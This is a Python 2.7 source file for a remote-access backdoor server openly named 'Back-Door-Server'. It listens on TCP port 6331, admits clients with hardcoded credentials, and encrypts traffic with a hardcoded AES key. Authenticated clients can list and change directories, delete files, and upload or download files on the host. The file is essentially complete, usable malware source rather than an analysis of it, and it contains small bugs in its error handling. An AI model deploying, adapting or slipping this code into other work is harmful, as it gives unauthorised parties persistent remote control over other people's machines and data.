#!/usr/bin/python2.7
# -*- coding:utf-8 -*-

__doc__ = """
# Name    :  Back-Door-Server
# Author  :  Shinukami
# Date    :  2016-3-14
# Version :  0.0.4
"""

import os, socket, sys, struct
try:
    from Crypto.Cipher import AES
except ImportError:
    print "Please install pycrypto by : pip install pycrypto"


class Cipher(object):

    def __init__(self):
        self.IV   = "C1^s$gbPF]'+>,~`"
        self.key  = "Z1v.#6KpSln2X@,}"
        self.Cobj = AES.new(self.key, AES.MODE_ECB)

    def pad(self, instr, length):
        if(length == None): raise Exception("Function pad : Null pad-length")
        elif(len(instr) % length == 0):return instr
        else:return instr + '\x04' * (length - (len(instr) % length ))

    def encrypt_block(self, plaintext):
        return self.Cobj.encrypt(plaintext)

    def decrypt_block(self, ctxt):
        return self.Cobj.decrypt(ctxt)

    def xor_block(self, first, second):
        if(len(first) != len(second)): raise Exception("Function xor_block : Not equal length !")
        first = list(first)
        second = list(second)
        for i in range(0,len(first)):
            first[i] = chr(ord(first[i]) ^ ord(second[i]))
        return ''.join(first)

    def Encrypt(self, plaintext):
        if(len(plaintext) % len(self.key) != 0):
            plaintext = self.pad(plaintext,len(self.key))
        blocks = [plaintext[x:x+len(self.key)] for x in range(0,len(plaintext),len(self.key))]
        for i in range(0,len(blocks)):
            if (i == 0):
                ctxt = self.xor_block(blocks[i],self.IV)
                ctxt = self.encrypt_block(ctxt)
            else:
                tmp = self.xor_block(blocks[i],ctxt[-1 * (len(self.key)):])
                ctxt = ctxt + self.encrypt_block(tmp)
        return ctxt

    def Decrypt(self, ctxt):
        if(len(ctxt) % len(self.key) != 0):
            raise Exception("Decrypt Invalid Key.")
        blocks = [ctxt[x:x+len(self.key)] for x in range(0,len(ctxt),len(self.key))]
        for i in range(0,len(blocks)):
            if (i == 0):
                ptxt = self.decrypt_block(blocks[i])
                ptxt = self.xor_block(ptxt,self.IV)
            else:
                tmp = self.decrypt_block(blocks[i])
                tmp = self.xor_block(tmp,blocks[i-1])
                ptxt = ptxt + tmp
        return ptxt.strip('\x04')

class BackDoorServer(object):

    def __init__(self):
        self.host = ""
        self.port = 6331
        self.BUFSIZE = 1024
        self.name = "shinukami"
        self.password = "shinukami"
        self.FILEINFO_SIZE=struct.calcsize('128s1s1I')
        self.DATAINFO_SIZE=struct.calcsize('1024s')

        self.Server = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        self.Server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.Server.bind((self.host, self.port))
        self.Server.listen(2)

        self.Shell_command = ["upload","download","ls","cd","pwd","delete"]

        self.Crypto = Cipher()

    def HELP(self):
        HELP_doc = __doc__ + """
            This is a Python-Back-Door. Here are some commands:

            help        : Show this document
            ls          : List current directory
            cd          : Change the shell working directory
            pwd         : Print the current directory
            delete      : Delete a file
            upload      : Upload a file to the Server
            download    : Download a file to the remote PC
        """
        HELP_doc = struct.pack('1024s',HELP_doc)
        HELP_doc = self.Crypto.Encrypt(HELP_doc)
        self.Clientsock.send(HELP_doc)

    def Upload(self,filename):
        filenameS = self.Crypto.Encrypt(filename)
        f = open(filename,'rb')
        new_f = open("new"+filename,'wb')
        new_f.write( self.Crypto.Encrypt(f.read()) )
        new_f.close()
        f.close()
        size = os.stat("new"+filename).st_size
        fhead=struct.pack('128s1s1I',filenameS,'|',size)
        self.Clientsock.send(fhead)
        f = open("new"+filename,'rb')
        try:
            while 1:
                Upload_Data = f.read(self.BUFSIZE)
                if not Upload_Data:break
                sent = self.Clientsock.send(Upload_Data)
            f.close()
            os.remove("new"+filename)
        except Exception as error_code:
            print "Exception occur : %s"%(error_code, filename)

    def Download(self, filename):
        fhead = self.Clientsock.recv(self.FILEINFO_SIZE)
        fhead = self.Crypto.Decrypt(fhead)
        filename,temp1,filesize=struct.unpack('128s1s1I',fhead)
        restsize = filesize
        f = open(filename.strip('\00'),"wb")
        data = ""
        while True:
            if restsize > self.BUFSIZE:
                Download_Data = self.Clientsock.recv(self.BUFSIZE)
            else:
                Download_Data = self.Clientsock.recv(restsize)
            if not Download_Data:break
            data += Download_Data
            restsize = restsize-len(Download_Data)
            if restsize == 0:break
        f.write(self.Crypto.Decrypt(data))
        f.close()

    def Delete(self, filename):
        try:
            os.remove(filename)
        except Exception as e:
            self.Clientsock.send(self.Crypto.Encrypt(struct.pack('1024s',e)))
        self.Clientsock.send(self.Crypto.Encrypt(struct.pack('1024s','Delete Succeed !')))

    def LS(self, PATH='.'):
        data = ""
        for each in os.listdir(PATH):
            data += each +"\n"
        data = struct.pack('1024s',data.strip('\n'))
        data = self.Crypto.Encrypt(data)
        self.Clientsock.send(data)

    def PWD(self):
        self.Clientsock.send(self.Crypto.Encrypt(struct.pack('1024s',os.getcwd())))

    def CD(self, PATH='.'):
        try:
            os.chdir(PATH)
        except Exception as e:
            self.Clientsock.send(self.Crypto.Encrypt(struct.pack('1024s',e)))
        else:
            self.Clientsock.send(self.Crypto.Encrypt(struct.pack('1024s','')))

    def BackShell(self):
        while 1:
            Pre_shell = """[BackDoor@Shell %s]"""%(os.getcwd().split("/")[-1])
            Pre_shell = struct.pack('1024s',Pre_shell)
            Pre_shell = self.Crypto.Encrypt(Pre_shell)
            self.Clientsock.send(Pre_shell)
            CMD = self.Clientsock.recv(self.DATAINFO_SIZE)
            CMD = self.Crypto.Decrypt(CMD)
            CMD = struct.unpack('1024s',CMD)[0].strip('\00')
            CMD = CMD.split(" ")
            if CMD[0] == "download":
                self.Upload(CMD[1])
            elif CMD[0] == "upload":
                self.Download(CMD[1])
            elif CMD[0] == "ls":
                self.LS()
            elif CMD[0] == "cd":
                self.CD(CMD[1])
            elif CMD[0] == "pwd":
                self.PWD()
            elif CMD[0] == "delete":
                self.Delete(CMD[1])
            else :
                self.HELP()

    def Authenticate(self):
        Information = self.Clientsock.recv(self.DATAINFO_SIZE)
        Information = self.Crypto.Decrypt(Information)
        Information = struct.unpack('1024s',Information)[0].strip('\00')
        if self.name+'|'+self.password == Information:
            self.Clientsock.send(self.Crypto.Encrypt(struct.pack('1024s',"Authenticate Succeed !!!")))
        else:
            self.Clientsock.send(self.Crypto.Encrypt(struct.pack('1024s',"Authenticate Fail !!!")))
            raise Exception("Authentication Failed !!!")

    def Start(self):
        while 1:
            try:
                self.Clientsock, self.Clientaddr = self.Server.accept()
                self.Authenticate()
            except Exception as e:
                print "ERROR : %s"%(e)
                self.Clientsock.close()
            try:
                self.BackShell()
            except Exception as e:
                print "ERROR : %s"%(e)
            finally:
                self.Clientsock.close()

if __name__ == "__main__":
    Server = BackDoorServer()
    Server.Start()
